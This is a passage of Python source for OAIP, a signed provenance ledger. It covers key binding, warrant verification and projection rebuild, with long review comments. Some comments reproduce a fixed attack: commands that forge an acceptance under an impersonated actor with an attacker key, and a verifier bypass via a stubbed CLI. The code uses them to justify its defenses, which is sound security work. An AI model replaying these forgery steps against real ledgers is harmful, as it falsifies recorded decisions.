        # key is right, the message is not.
        why = ("(OAIP's own Ed25519 check). The record is in the store and "
               "nothing was recorded here — whatever produced it is not "
               "signing with the key it claims.")
        if legacy_signature(wid, signed):
            why = ("(OAIP's own Ed25519 check). The record is in the store and "
                   "nothing was recorded here.\n  " + LEGACY_SIG_MESSAGE
                   + f"\n  The configured Warrant CLI ({' '.join(WARRANT)}) "
                   "signs the pre-v1 message; OAIP requires SPEC v0.4 "
                   "(warrant >= 0.6.0). Upgrade it — the two constructions are "
                   "disjoint by design and OAIP has no mode that accepts both.")
        sys.exit(f"filed warrant {wid[:12]}: the signature attributed to "
                 f"{a.actor} does NOT verify against key {signed_key[:12]} "
                 + why)
    bind_actor(a.actor, signed_key)
    con.execute("INSERT OR IGNORE INTO warrants(claim_id,warrant_id,created_at)"
                " VALUES (?,?,?)", (a.claim, wid, wts))
    con.commit()
    print(f"ACCEPTED -> warrant {wid}\n  (signed, hash-addressed, cites the "
          f"provenance, the check blob and its transcript as evidence; the "
          f"validation ran under {runtime} and is recorded as such)")


def cmd_bind(a):
    """Record in OAIP's keyring that a key may sign as an actor.

    `cmd_accept` does this automatically for every acceptance it files, so a
    ledger used through `oaip accept`/`oaip do` never needs this command. It
    exists for two honest cases: a store created BEFORE OAIP had a keyring (whose
    acceptances would otherwise stop producing edges at the next rebuild, because
    nothing vouches for their signer), and an acceptance filed through the Warrant
    CLI directly. Naming the key is the operator's assertion, not OAIP's
    discovery — which is why it is a separate, explicit verb.

    AND WHY IT CROSS-CHECKS `.oaip/dev.key.pub` (2026-07-30, third review round).
    `cmd_accept` refuses to record an acceptance signed by a key that is not this
    ledger's own; `bind` accepted ANY hex64 with no cross-check and no warning,
    and `oaip verify` was clean afterwards — so the one command whose entire
    purpose is to say "this key may sign as this actor" was the least careful
    place in the codebase about which key that is. A foreign key is a real,
    legitimate case (a store filed by another ledger's key), but it is a
    different act from vouching for one's own, and it now has to be said out
    loud: --foreign-key."""
    require_trust_custody()
    warn_workspace_trust_root()
    key = a.key
    own = PUBKEY.read_text().strip() if PUBKEY.is_file() else None
    if key is None:
        if not own:
            sys.exit(f"no {PUBKEY}: this ledger does not know its own public key "
                     "(it predates `init` recording it) — pass --key <hex64>, "
                     "e.g. the `key` field of a signature in "
                     f"{WSTORE / 'records'}")
        key = own
    if not (isinstance(key, str) and HEX64.match(key)):
        sys.exit("--key must be a 64-hex-character Ed25519 public key")
    # AND IT MUST BE A KEY THAT COULD EVER SIGN (F5, 2026-07-30, fourth round).
    # `bind` took any hex64: `oaip bind --actor a --foreign-key --key 0100…00`
    # succeeded and wrote the small-order key into the keyring. Harmless in the
    # sense that `ed25519_verify` refuses every signature under such a key — but
    # the one command whose whole job is to say "this key may sign as this actor"
    # was the only place that did not apply this project's own key-validity rule,
    # and a keyring entry that can never decide anything is a lie about custody.
    if weak_ed25519_pubkey(bytes.fromhex(key)):
        sys.exit(f"refusing to bind {key[:12]}: it is not a usable Ed25519 "
                 "public key — small-order or non-canonically encoded, which "
                 "Warrant SPEC §5 requires every conforming verifier to reject. "
                 "OAIP's own verifier refuses every signature under it, so this "
                 "binding could only ever vouch for a key that decides nothing.")
    if own and key != own and not getattr(a, "foreign_key", False):
        sys.exit(f"refusing to bind {key[:12]}: this ledger's own key is "
                 f"{own[:12]} ({PUBKEY}), so this binding vouches for a key OAIP "
                 "does not custody and cannot revoke — every acceptance signed by "
                 "it will become an edge in this projection. If the store really "
                 "was filed by another ledger's key, say so: `oaip bind --actor "
                 f"{a.actor} --key {key[:12]}… --foreign-key`.")
    if own and key != own:
        print(f"warning: binding a FOREIGN key. {key[:12]} is not this ledger's "
              f"own key ({own[:12]}); OAIP does not hold it, cannot revoke it, "
              "and will derive an acceptance edge from anything it signs as "
              f"{a.actor!r}.", file=sys.stderr)
    if not own:
        print(f"warning: no {PUBKEY}, so this binding could not be cross-checked "
              "against this ledger's own key.", file=sys.stderr)
    bind_actor(a.actor, key)
    print(f"bound key {key[:12]} -> actor {a.actor}  ({TRUST})")


def cmd_do(a):
    """One-shot: intent → run → validate → accept-if-pass. The ergonomic verb —
    an agent action becomes a signed decision only if its validation check
    passes, in a single command (SPEC §4)."""
    from argparse import Namespace
    i = cmd_intent(Namespace(description=a.intent, parent=None, actor=a.actor,
                             constraint=None, acceptance_ref=None))
    eid = cmd_run(Namespace(intent=i, command=a.command, actor=a.actor))
    cid, supported = cmd_claim(Namespace(
        execution=eid, actor=a.actor, predicate=(a.predicate or a.intent),
        check=a.check,
        allow_check_effects=getattr(a, "allow_check_effects", False)))
    if supported:
        cmd_accept(Namespace(claim=cid, actor=a.actor))
    else:
        print("NOT accepted — validation check failed "
              "(execution success is not acceptance; no warrant filed)")
        sys.exit(1)


def show_invocation(stored):
    """An argv array, rendered for a human without pretending it is a string.

    The projection stores the canonical ARRAY (§2.4); only the display joins it,
    and it quotes any element containing whitespace so that the rendering does
    not reintroduce the ambiguity the array form exists to remove."""
    try:
        argv = json.loads(stored)
    except (ValueError, TypeError):
        return str(stored)
    if not isinstance(argv, list):
        return str(stored)
    return " ".join(f'"{s}"' if any(c.isspace() for c in str(s)) else str(s)
                    for s in argv)


def cmd_log(_):
    # A projection a rebuild refused is not a report; it is a suspect (C2-F1a).
    require_trusted_projection()
    con = db()
    for i in con.execute("SELECT id,objective,format FROM intents ORDER BY id"):
        legacy = "  [legacy 0.0 record]" if i[2] != "0.1" else ""
        print(f"INTENT {i[0]}  {i[1]}{legacy}")
        for e in con.execute(
                "SELECT id,invocation,status,exit_code,effects_n FROM "
                "(SELECT e.id,e.invocation,e.status,e.exit_code,COUNT(f.id) effects_n"
                " FROM executions e LEFT JOIN effects f ON f.execution_id=e.id "
                " WHERE e.intent_id=? GROUP BY e.id)", (i[0],)):
            print(f"  EXEC {e[0]}  `{show_invocation(e[1])}`  {e[2]}={e[3]}  "
                  f"effects={e[4]}")
            for c in con.execute("SELECT id,predicate,verdict FROM claims "
                                 "WHERE execution_id=?", (e[0],)):
                sup = "supported" if c[2] == "pass" else "unsupported"
                print(f"    CLAIM {c[0]}  {c[1]}  [{sup}]")
                for wr in con.execute("SELECT warrant_id FROM warrants WHERE claim_id=?", (c[0],)):
                    print(f"      WARRANT {wr[0][:16]}…  (signed decision)")


def read_warrant_store():
    """(accepts, record_files, errors) over the decision half of the canonical layer.

    Every accept is returned as a dict carrying its subject hash, WarrantID, ts,
    subject note AND ITS ENVELOPE — the envelope, because the signatures are what
    `signer_gate` has to inspect, and re-reading the file later would be a second
    observation of a mutable directory.

    Integrity-checked before anything is derived from it, for the reason
    `read_artifact` gives about the artifact half: a record whose body does not
    hash to its own filename is not that record. Address-matching is NOT
    verification, though — see the three layers named in `cmd_rebuild`."""
    accepts, errors = [], []
    wrec_dir = WSTORE / "records"
    files = sorted(wrec_dir.glob("*.json")) if wrec_dir.is_dir() else []
    for path in files:
        if not HEX64.match(path.stem):
            # Not forged — not a record at all. A stray notes.json used to be
            # reported as "does not match its own address", misdiagnosing a
            # benign file as a forgery. Say what it is, precisely.
            errors.append(f"warrant store: stray file {path.name} in records/ — "
                          "its name is not a record address; remove it (the "
                          "Warrant store treats every records/*.json as a record)")
            continue
        try:
            # SIZE BEFORE BYTES (F1). `sigs` is outside the hashed body, so a
            # record can be padded without end and still match its own address;
            # reading and parsing 100 MB of that is a denial of service the
            # signature caps below cannot reach, because it happens first.
            size = path.stat().st_size if path.is_file() else 0
            if size > MAX_STORE_RECORD_BYTES:
                errors.append(
                    f"warrant {path.stem[:12]}: the record file is {size} bytes, "
                    f"over the {MAX_STORE_RECORD_BYTES}-byte limit for a store "
                    "record — an honest accept is well under a kilobyte, and the "
                    "signature list is outside the hashed body, so a record can "
                    "be padded without breaking its address. Refusing to read it")
                continue
            doc = loads_ijson(path.read_bytes())
        except OSError as e:
            # A DIRECTORY named <hex64>.json is a legal record ADDRESS that is not
            # a record. The except clause here was narrowed to ValueError, so this
            # raised IsADirectoryError and printed a traceback instead of a
            # diagnosis (F12, 2026-07-30).
            kind = "a directory" if path.is_dir() else "unreadable"
            errors.append(f"warrant store: {kind} at record address "
                          f"{path.name} ({type(e).__name__}) — not a record; "
                          "remove it")
            continue
        except ValueError as e:
            errors.append(f"warrant {path.stem[:12]}: unreadable record: {e}")
            continue
        body = doc.get("body") if isinstance(doc, dict) else None
        if not isinstance(body, dict):
            # A crafted non-dict body at a valid address used to crash this
            # function with an AttributeError; a refusal is a decision, a
            # traceback is an accident.
            errors.append(f"warrant {path.stem[:12]}: envelope has no body object "
                          "— not a warrant record")
            continue
        if sha256(canon(body)) != path.stem:
            errors.append(f"warrant {path.stem[:12]}: body hashes to "
                          f"{sha256(canon(body))[:12]} — record does not match "
                          "its own address")
            continue
        if body.get("decision") == "accept":
            subj = body.get("subject") if isinstance(body.get("subject"), dict) else {}
            accepts.append({"subject": subj.get("hash"), "wid": path.stem,
                            "ts": body.get("ts"),
                            "note": subj.get("note") if isinstance(subj.get("note"), str) else "",
                            "env": doc})
    return accepts, files, errors


def signer_gate(report, actors, unbound_sigs):
    """Return `assess(wid, env) -> (refusal|None, notes)`: does this record's
    signature establish WHO accepted?

    THE DEFECT THIS CLOSES (F7/F3, 2026-07-30, second adversarial round). The
    previous gate was `warrant verify` exiting 0, and Warrant exits 0 for a
    cryptographically valid signature whose key nobody vouches for — by
    specification (§5: report the binding as unverified; §5.1: "Bound/unbound is
    a report"). Reproduced end to end on this branch before this function:

        warrant keygen --out attacker.key
        warrant --store .oaip/warrants accept --subject <a real claim's subject> \\
                --note oaip-claim:<that claim's id> --actor tester@local \\
                --key attacker.key
        oaip rebuild   ->  warrant=1
        oaip log       ->  WARRANT 41d32da62a81…  (signed decision)

    for a claim NOBODY accepted, with the actor `tester@local` freely
    impersonated. The condition that must hold is one condition, about ONE
    signature — the one the record's own `body.actor.id` is answerable for:
      * it VERIFIES under OAIP's own Ed25519 check, over the WarrantID OAIP
        recomputed from the record's bytes (C2-F1a: delegating this to a
        subprocess named by an environment variable made it forgeable); and
      * it names a key bound to that actor in `.oaip/trust.json` — the ENFORCED
        rule, OAIP's own, because Warrant has none to enforce; and
      * Warrant's settlement grade does not itself call THAT signature unbound
        against that same keyring file — corroboration, not the primary check.

    Everything else on the record is a NOTE. Requiring all signatures to be bound
    (and treating any "excluded signature" finding as fatal) made an appended
    co-signature — which Warrant SPEC §5 explicitly permits, and which
    `warrant verify` passes at 0 errors — silently delete the acceptance edge
    (C2-F1b). A second endorser must be expressible; a griefer must not be able
    to erase a decision by adding to it."""
    per_record = findings_by_record(report) if report else {}

    def assess(wid, env):
        why, notes, key, actor = accepting_signature(wid, env, actors)
        # Warrant reports one finding PER appended signature too, so this half of
        # the notes floods with the record just as `accepting_signature`'s half
        # did (F2): capped and counted the same way.
        wsaid = [m for m in per_record.get(wid, [])
                 if any(k in m for k in _AMBIGUOUS_SIG)]
        notes += [f"Warrant reports: {m}" for m in wsaid[:SIG_NOTE_CAP]]
        if len(wsaid) > SIG_NOTE_CAP:
            notes.append(f"Warrant reports {len(wsaid) - SIG_NOTE_CAP} further "
                         "excluded or unreadable signature(s) on this record, "
                         "not listed individually")
        if why is None and unbound_sigs and key and (
                wid[:12], key[:12], actor) in unbound_sigs:
            why = (f"Warrant's settlement grade reports THIS signature (key "
                   f"{key[:12]}, actor {actor!r}) unbound against {TRUST}")
        return why, notes

    return assess


def cmd_rebuild(a):
    """Reconstruct the SQLite projection from the canonical layer alone (§5).

    The MUST this exists to make true: "Deleting the projection and rebuilding it
    from artifacts + warrants MUST yield the same graph." Until 2026-07-30 there
    was no way to attempt it, and the attempt would have failed -- the invocation,
    exit code, state snapshots and environment fingerprint lived only in rows.

    Reads ONLY the canonical layer -- .oaip/artifacts plus the Warrant store,
    which is exactly what §5 names ("artifacts + warrants"). If it needs the
    database to rebuild the database, the claim is circular and the check is
    worthless. The Warrant store half was missing until later on 2026-07-30:
    rebuild never repopulated the `warrants` table, so the claim→warrant
    ACCEPTANCE edge -- the one fact this protocol exists to record -- survived
    `do` and died at the first rebuild, and `oaip log` silently lost its
    WARRANT line. "The same graph" minus its most important edge is not the
    same graph.
    """
    with store_lock():
        return _rebuild(a)


def _rebuild(a):
    allow_legacy = bool(getattr(a, "allow_legacy_links", False))
    # Read and validate the canonical layer BEFORE touching the projection. A
    # fail-closed check that deletes the database and then refuses to rebuild it
    # has destroyed the thing it was protecting.
    # The two halves of the canonical layer are counted SEPARATELY. Every fault
    # used to be reported as "corrupt artifact(s) in the canonical layer" — so a
    # stray file in the Warrant store, or a Warrant CLI that could not run, was
    # announced as artifact corruption and sent the reader to the wrong directory
    # (F13, 2026-07-30). A diagnosis that names the wrong layer is worse than no
    # diagnosis, because it is acted on.
    records = []
    rec_addr = {}                  # id(doc) -> the address it was read from
    rec_type = {}                  # id(doc) -> its registered type tag
    legacy = []                    # (address, "<type>@v1", doc) — §6.4
    art_bad, store_bad, unread = [], [], []
    for path in sorted(ART.glob("*")):
        # An artifact whose bytes do not hash to its address is not a record with
        # a problem, it is not that record at all. Rebuilding from it would
        # launder a forgery into the projection — which is exactly what happened
        # before this check existed.
        doc, err = read_artifact(path)
        if err:
            art_bad.append(err)
            continue
        outcome, t, ver, detail = validate_record(doc)
        if outcome == "valid":
            records.append(doc)
            rec_addr[id(doc)] = path.name
            rec_type[id(doc)] = t
        elif outcome == "invalid":
            # A record whose SHAPE is wrong is not a record to project. Before
            # this branch existed the rebuild read whatever members happened to
            # be there and wrote them into columns, so a record no conforming
            # reader could parse still produced rows.
            art_bad.append(f"{path.name[:12]}: {t or 'record'} is not valid: "
                           f"{detail}")
        elif outcome == "legacy":
            why = legacy_shape_ok(doc, t)
            if why:
                art_bad.append(f"{path.name[:12]}: {why}")
            else:
                legacy.append((path.name, t, doc))
        elif outcome in ("unsupported-version", "unknown-type"):
            # §6.2: NOT valid and NOT corrupt. Reported as its own outcome, left
            # untouched on disk, and it does not refuse the rebuild — refusing a
            # whole store because one record is from the future is how a
            # forward-compatible writer becomes indistinguishable from an
            # attacker.
            unread.append((path.name, outcome, t, ver, detail))

    # SPEC §6.2, the fail-closed clause: where a record this reader UNDERSTANDS
    # cites one it does not, the derivation that needed the citation MUST fail.
    # It must not proceed as though the citation were absent or satisfied — a
    # claim whose subject is a record from the future is not a claim with a
    # missing subject, it is a claim about something this reader cannot see, and
    # projecting it with a NULL in that column asserts the opposite.
    #
    # This is reachable only across versions: within one ledger an address IS
    # the bytes, so the cited record cannot be swapped for an unreadable one.
    # The real case is a v0.2 writer emitting a still-v0.1 claim that cites a
    # v0.2 State, read here.
    unread_addr = {name for name, _o, _t, _v, _d in unread}
    if unread_addr:
        for d in records:
            bad = sorted(hash_citations(d, rec_type[id(d)]) & unread_addr)
            if bad:
                art_bad.append(
                    f"{rec_addr[id(d)][:12]}: this {rec_type[id(d)]} cites "
                    f"{', '.join(b[:12] for b in bad)}, which this reader "
                    "cannot read (§6.2: a citation to an unreadable record "
                    "fails closed — deriving anything from it would assert the "
                    "citation was absent or satisfied, and it is neither)")

    # The other half of the canonical layer: the Warrant store.
    accepts, wrec_files, store_errs = read_warrant_store()
    store_bad += store_errs

    # WHAT VERIFICATION MEANS HERE, IN THREE LAYERS THAT WERE EACH ADDED AFTER
    # THE PREVIOUS ONE WAS BROKEN BY REVIEW (2026-07-30, two rounds):
    #   1. address-matching (above) — satisfied BY CONSTRUCTION by anyone who can
    #      write a file, so it establishes nothing about who decided.
    #   2. `warrant verify` — a corroborating delegate, never the decider. It was
    #      broken as a decider two ways: `WARRANT_CLI=/usr/bin/true` exits 0
    #      having verified nothing, and a cryptographically valid signature by a
    #      key nobody vouches for also exits 0, because Warrant reports an unbound
    #      key↔actor binding as a WARN by SPECIFICATION (§5, §5.1). Requiring a
    #      parseable `warrant.verify-report@v0` ruled out the accident; a stub
    #      that prints one defeated it entirely (third round, C2-F1a). Errors
    #      reported here still refuse a rebuild — a delegate may veto.
    #   3. SIGNATURE + BINDING (this layer, OAIP's own, in process): the
    #      signature by the actor the record NAMES must verify under
    #      `ed25519_verify` over the WarrantID OAIP recomputed, AND name a key
    #      bound to that actor in `.oaip/trust.json`, which only
    #      `cmd_accept`/`oaip bind` ever write. An accept signed by an unknown key
    #      — or by no key at all — gets NO EDGE, whatever any subprocess says.
    #      Other signatures are reported and cannot un-decide it (C2-F1b).
    report, unbound_sigs, actors = None, None, {}
    if wrec_files:
        report, rerr = store_report()
        if rerr:
            store_bad.append(f"warrant store: {rerr}")
        elif report["errors"]:
            first = next((f"{f.get('subject','')[:12]} {f.get('message')}"
                          for f in report["findings"]
                          if isinstance(f, dict) and f.get("level") == "ERR"), "")
            store_bad.append("warrant store: `warrant verify` reported "
                             f"{report['errors']} error(s) — an unverified "
                             f"acceptance must not become an edge ({first})")
            # OAIP MUST BE ABLE TO EXPLAIN ITS OWN REFUSAL. This branch quotes
            # the delegate's first ERR and stops, which is correct as a veto and
            # useless as a diagnosis for the one cause that is a MIGRATION: a
            # store signed before Warrant SPEC v0.4. `signer_gate` would name it
            # (see `legacy_signature`) but never runs — the refusal above is
            # already fatal — so the record is examined here instead, by OAIP,
            # in process. Adds a sentence to a refusal; changes no verdict, no
            # edge and no exit status.
            legacy = sorted({a["wid"][:12] for a in accepts
                             if any(legacy_signature(a["wid"], s)
                                    for s in (a["env"].get("sigs") or [])[:SIG_DECIDE_CAP]
                                    if isinstance(s, dict))})
            if legacy:
                store_bad.append(
                    f"warrant store: {len(legacy)} record(s) carry a signature "
                    f"under the PRE-v1 construction ({', '.join(legacy[:5])}"
                    + (", …" if len(legacy) > 5 else "") + "). "
                    + LEGACY_SIG_MESSAGE
                    + " — OAIP has no mode that accepts both constructions; they "
                      "are disjoint by design (Warrant SPEC §5, DEC-001 §4.3), "
                      "and this is NOT the §6.4 legacy-read path (SPEC §8.6)")
        else:
            actors, aerr = read_trust()
            if aerr:
                store_bad.append(f"keyring: {aerr}")
            unbound_sigs = unbound_by_warrant()

    # The store-format marker decides which records may take the weaker,
    # subject-hash link path. Read it HERE, with the other preflight checks, and
    # refuse on an unreadable one: failing open here made a corrupt byte in
    # `.oaip/store.json` promote a brand-new store to "legacy" (C3-F1).
    cutoff, cutoff_err = note_convention_since()
    meta_bad = [cutoff_err] if cutoff_err else []
    # Custody, checked here and not only inside `read_trust`, because that
    # function is reached only when there is a store to report on: a ledger whose
    # keyring anyone on the host may rewrite must refuse to project acceptance
    # edges even before the first accept is filed (O4).
    custody_bad = trust_perm_errors()
    warn_workspace_trust_root()

    # What the CURRENT projection asserts, read before it is replaced. A rebuild
    # that drops the protocol's central edge must not report success (C2-F1b):
    # one appended co-signature made `oaip rebuild` print `warrant=0`, exit 0,
    # and `oaip log` lose its WARRANT line — a fact deleted, announced as a
    # successful reconstruction.
    prev_edges = set()
    if DB.is_file():
        try:
            # A DIRECT connection, deliberately not `db()`: rebuild is the ONE
            # command that must work against a projection whose schema this
            # build cannot otherwise read, since regenerating it is the whole
            # point. The `warrants` table has held (claim_id, warrant_id) in
            # every schema, so the comparison that protects the acceptance edge
            # survives the upgrade it is protecting against.
            con0 = sqlite3.connect(DB)
            prev_edges = {(r[0], r[1]) for r in
                          con0.execute("SELECT claim_id, warrant_id FROM warrants")}
            con0.close()
        except sqlite3.Error:
            prev_edges = set()          # unreadable: nothing to compare against

    if art_bad or store_bad or meta_bad or custody_bad:
        for e in art_bad + store_bad + meta_bad + custody_bad:
            print("ERR ", e, file=sys.stderr)
        # Each layer is COUNTED AND NAMED SEPARATELY, including this ledger's own
        # metadata: a diagnosis that sends the reader to the wrong directory is
        # worse than none, because it is acted on (F13).
        where = ", ".join(
            p for p in (f"{len(art_bad)} corrupt artifact(s) in {ART}" if art_bad
                        else "",
                        f"{len(store_bad)} fault(s) in the decision layer "
                        f"({WSTORE})" if store_bad else "",
                        f"{len(meta_bad)} fault(s) in this ledger's own "
                        f"metadata ({STOREMETA})" if meta_bad else "",
                        f"{len(custody_bad)} custody fault(s) in the trust root "
                        f"({TRUST_ROOT})" if custody_bad else "") if p)
        mark_untrusted(art_bad + store_bad + meta_bad + custody_bad)
        sys.exit(f"refusing to rebuild: {where} — the projection would assert "
                 "facts the canonical layer does not support. The existing "
                 f"projection is left on disk but MARKED UNTRUSTED ({UNTRUSTED}): "
                 "`oaip log` and `oaip verify` will refuse it until a rebuild "
                 "succeeds.")

    # BUILD UNDER A TEMPORARY NAME, THEN RENAME (F10). The old code deleted
    # `ledger.db` and rebuilt in place, so between those two moments there was no
    # projection at all — and a second rebuild racing the first hit
    # FileNotFoundError on the unlink. `os.replace` is atomic on POSIX: a reader
    # sees the old projection or the new one, never neither.
    tmp_db = OAIP / "ledger.rebuild.db"
    tmp_db.unlink(missing_ok=True)
    con = db(tmp_db)
    con.executescript(SCHEMA)       # one schema definition, not a copy of it
    # Deterministic order: by timestamp then id, so a rebuild is reproducible and
    # two rebuilds of the same artifacts give the same projection.
    records.sort(key=lambda d: (d.get("ts", 0), d.get("id", "")))
    # A claim cites its subject by hash and the EXECUTION lives in the subject
    # (§2.8), so the claim→execution edge is re-derived through the subject
    # record — from the canonical layer, not from the database being rebuilt.
    subject_exec = {rec_addr[id(d)]: d.get("execution_id") for d in records
                    if rec_type[id(d)] == "claim_subject"}
    counts = {"intent": 0, "state": 0, "execution": 0, "effect": 0,
              "attribution": 0, "claim": 0}
    for d in records:
        kind = rec_type[id(d)]
        if kind == "intent":
            con.execute("""INSERT OR REPLACE INTO intents(id,actor,objective,
                           parent_id,constraints,acceptance_refs,created_at,format)
                           VALUES (?,?,?,?,?,?,?,?)""",
                        (d["id"], d["actor"], d["objective"], d["parent"],
                         canon(d["constraints"]).decode(),
                         canon(d["acceptance_refs"]).decode(), d["ts"], "0.1"))
        elif kind == "state":
            con.execute("""INSERT OR REPLACE INTO states(id,repo_commit,
                           worktree_tree,env_fingerprint,toolchain_fingerprint)
                           VALUES (?,?,?,?,?)""",
                        (rec_addr[id(d)], d["repo_commit"], d["worktree_tree"],
                         d["env_fingerprint"], d["toolchain_fingerprint"]))
        elif kind == "execution":
            con.execute("""INSERT OR REPLACE INTO executions(id,intent_id,actor,
                           runtime,invocation,status,exit_code,input_state,
                           output_state,environment,output,created_at,format)
                           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d["intent_id"], d["executor"]["actor"],
                         d["executor"]["runtime"], canon(d["invocation"]).decode(),
                         d["status"], d["exit_code"], d["input_state"],
                         d["output_state"], d["environment"], d["output"],
                         d["ts"], "0.1"))
        elif kind == "effect":
            con.execute("""INSERT OR REPLACE INTO effects(id,execution_id,kind,
                           target,before_blob,after_blob) VALUES (?,?,?,?,?,?)""",
                        (d["id"], d["execution_id"], d["kind"], d["target"],
                         d["before"], d["after"]))
        elif kind == "attribution":
            con.execute("""INSERT OR REPLACE INTO attributions(id,effect_id,cause,
                           method,confidence_ppm) VALUES (?,?,?,?,?)""",
                        (d["id"], d["effect_id"], d["cause"], d["method"],
                         d["confidence_ppm"]))
        elif kind == "claim":
            v = d["validation"]
            con.execute("""INSERT OR REPLACE INTO claims(id,execution_id,predicate,
                           runtime,check_hash,verdict,transcript_hash,subject_hash,
                           evidence,proposed_by,created_at,format)
                           VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
                        (d["id"], subject_exec.get(d["subject"]), d["predicate"],
                         v["runtime"], v["check"], v["verdict"], v["transcript"],
                         d["subject"], canon(d["evidence"]).decode(),
                         d["proposed_by"], d["ts"], "0.1"))
        else:
            continue                    # claim_subject / artifact: not a row
        counts[kind] = counts.get(kind, 0) + 1
    # SPEC §6.4: the legacy half, projected under the legacy rules and MARKED.
    counts["legacy"] = 0
    for addr, tag, d in sorted(legacy, key=lambda x: (x[2].get("ts", 0),
                                                      x[2].get("id", ""))):
        if tag == "intent@v1":
            con.execute("""INSERT OR REPLACE INTO intents(id,actor,objective,
                           parent_id,constraints,acceptance_refs,created_at,
                           format) VALUES (?,?,?,?,?,?,?,?)""",
                        (d["id"], None, d["description"], d["parent"], None,
                         None, d["ts"], LEGACY_FORMAT))
        elif tag == "execution@v1":
            # `invocation` holds the STRING the legacy record carried, as a JSON
            # string rather than a one-element array: the argv was never
            # recorded, and a one-element array would assert an argv nobody
            # observed. `input_state`/`output_state` hold git TREE ids, which is
            # exactly why `format` exists.
            con.execute("""INSERT OR REPLACE INTO executions(id,intent_id,actor,
                           runtime,invocation,status,exit_code,input_state,
                           output_state,environment,output,created_at,format)
                           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d["intent"], None, None,
                         canon(d["command"]).decode(), None, d["exit_code"],
                         d["before_tree"], d["after_tree"], d["env_fp"],
                         d["stdout"], d["ts"], LEGACY_FORMAT))
            for n, e in enumerate(d["effects"] or []):
                # Legacy effects and attributions carry no ids (they were nested
                # members). The synthetic ids are DERIVED from the execution and
                # the position, so two rebuilds of the same artifact agree — §5
                # requires the same graph, not merely a similar one.
                fid = f"{d['id']}#legacy-effect-{n}"
                con.execute("""INSERT OR REPLACE INTO effects(id,execution_id,
                               kind,target,before_blob,after_blob)
                               VALUES (?,?,?,?,?,?)""",
                            (fid, d["id"],
                             {"created": "file.create", "modified": "file.modify",
                              "deleted": "file.delete"}.get(e.get("status"),
                                                            e.get("status")),
                             e.get("path"), e.get("before"), e.get("after")))
                at = e.get("attribution") or {}
                if at:
                    con.execute("""INSERT OR REPLACE INTO attributions(id,
                                   effect_id,cause,method,confidence_ppm)
                                   VALUES (?,?,?,?,?)""",
                                (f"{fid}#attribution", fid, at.get("cause"),
                                 at.get("method"), at.get("confidence_ppm")))
        elif tag == "claim@v1":
            # The check was stored as TEXT, so there is no blob to cite: the
            # column is NULL rather than the hash of bytes this ledger never
            # had. `verdict` is derived from the legacy boolean, which is the
            # one place the two vocabularies really do mean the same thing.
            con.execute("""INSERT OR REPLACE INTO claims(id,execution_id,
                           predicate,runtime,check_hash,verdict,transcript_hash,
                           subject_hash,evidence,proposed_by,created_at,format)
                           VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d["execution"], d["predicate"], None, None,
                         "pass" if d["supported"] else "fail", d["transcript"],
                         d["subject"], None, None, d["ts"], LEGACY_FORMAT))
        counts["legacy"] += 1

    # The claim→warrant edge, from the store records validated AND verified
    # above. Sorted filename order is deterministic, so two rebuilds agree
    # (same property the ts/id sort gives the artifact records).
    #
    # THE LINK IS EXPLICIT, AND MANDATORY (2026-07-30 adversarial review, both
    # rounds). The claim subject {predicate, execution, effects} excludes the
    # check command and the verdict, so a `--check true` claim and a `--check
    # false` claim over the same execution have IDENTICAL subject hashes — and
    # deriving the edge by subject hash projected one real signed acceptance onto
    # the FAILED claim too, changing the graph across rebuild (§5 MUST
    # violation). Accepts carry the accepted claim's id in subject.note
    # ("oaip-claim:<id>", inside the signed body) and rebuild follows that.
    #
    # ROUND TWO: the fallback for note-less records was ATTACKER-SELECTABLE.
    # "Has no note" is the writer's choice, and `note.startswith("oaip-claim:")`
    # made even the prefix's LETTER CASE the writer's choice. Reproduced: two
    # accepts filed directly with this project's own real key, one with no note
    # and one noted `OAIP-CLAIM:<id>`, both took the fallback, both produced an
    # edge, and `oaip verify` reported 0 errors. So:
    #   * the prefix is matched case-insensitively — a case variant can no longer
    #     downgrade anything, it simply IS the explicit link; and
    #   * the fallback is OFF unless BOTH (a) the operator passes
    #     --allow-legacy-links, and (b) the record predates this store's note
    #     convention per `.oaip/store.json` (see note_convention_since) — a
    #     criterion stamped by `init`, which the filer of a record cannot choose.
    # A claim, whatever its format, reduced to the three facts the acceptance
    # edge needs. Legacy claims MUST take part: an existing ledger's acceptance
    # is the one fact this protocol is for, and losing it at the upgrade would
    # be the §5 violation this project already found once, arriving by a new
    # route.
    claims_by_id = {}
    for d in records:
        if rec_type[id(d)] == "claim":
            claims_by_id[d["id"]] = (d["subject"],
                                     d["validation"]["verdict"] == "pass")
    for _addr, tag, d in legacy:
        if tag == "claim@v1":
            claims_by_id[d["id"]] = (d["subject"], bool(d["supported"]))
    supported_by_subject, claim_subjects = {}, set()
    for cid_, (subj_, ok_) in claims_by_id.items():
        claim_subjects.add(subj_)
        if ok_:
            supported_by_subject.setdefault(subj_, []).append(cid_)
    counts["warrant-edge"] = 0

    derived, refused_why = set(), {}

    def edge(cid, wid, wts):
        cur = con.execute("INSERT OR IGNORE INTO warrants(claim_id,warrant_id,"
                          "created_at) VALUES (?,?,?)", (cid, wid, wts))
        counts["warrant-edge"] += cur.rowcount or 0
        derived.add((cid, wid))

    assess_signer = signer_gate(report, actors, unbound_sigs)

    for acc in accepts:
        subj_hash, wid, wts, note = (acc["subject"], acc["wid"], acc["ts"],
                                     acc["note"])
        # WHO ACCEPTED, before WHAT was accepted. An acceptance whose named actor
        # did not sign it — or signed with a key nobody vouches for — is not that
        # actor's decision, however well-formed the rest of the record is (F7).
        why, notes = assess_signer(wid, acc["env"])
        for n in notes:
            # Reported, never fatal: §5 lets anyone append a co-signature, so a
            # co-signature must not be able to delete a decision (C2-F1b).
            print(f"NOTE  accept {wid[:12]}: {n}", file=sys.stderr)
        if why is not None:
            refused_why[wid] = why
            print(f"WARN  accept {wid[:12]}: {why} — no valid signature by a key "
                  "bound to the actor this record NAMES, so this is not that "
                  "actor's decision; no acceptance edge derived (`oaip bind "
                  "--actor <id>` if the key really is this ledger's)",
                  file=sys.stderr)
            continue
        if note[:len(NOTE_PREFIX)].lower() == NOTE_PREFIX:
            cid = note[len(NOTE_PREFIX):]
            c = claims_by_id.get(cid)
            if c is None:
                refused_why[wid] = (f"it names claim {cid}, which is no longer "
                                    "in the canonical layer")
                print(f"WARN  accept {wid[:12]} names claim {cid} — no such "
                      "claim record in the canonical layer; edge not derived",
                      file=sys.stderr)
